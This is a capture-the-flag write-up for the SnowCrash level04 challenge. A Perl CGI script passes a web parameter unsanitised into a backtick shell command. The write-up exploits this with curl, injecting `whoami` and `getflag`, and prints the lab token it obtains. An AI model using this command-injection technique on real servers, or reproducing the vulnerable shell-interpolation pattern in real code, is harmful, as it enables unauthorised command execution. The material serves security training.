##LEVEL04

```
    level04@SnowCrash:~$ ls
    level04.pl
```


```
    level04@SnowCrash:~$ cat level04.pl 
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
```

as we can see, we have a perl script that echos anything in parameter x
and we have a commented section **# localhost:4747** that indecate that there is a web server running on localhost:4747

```
    level04@SnowCrash:~$ cat /var/www/level04/level04.pl 
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
```

we can check with curl

```
    level04@SnowCrash:~$ curl -d x=ss http://localhost:4747/level04.pl
    ss
```

```
    level04@SnowCrash:~$ curl -d x=\`whoami\` http://localhost:4747/level04.pl
    flag04
```

as we can see user flag04 is the one running the server on port 4747 so we can run getflag as flag04 user


```
    level04@SnowCrash:~$ curl -d x=\`getflag\` http://localhost:4747/level04.pl
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

```
su level04
password:ne2searoevaevoem4ov4ar8ap
```
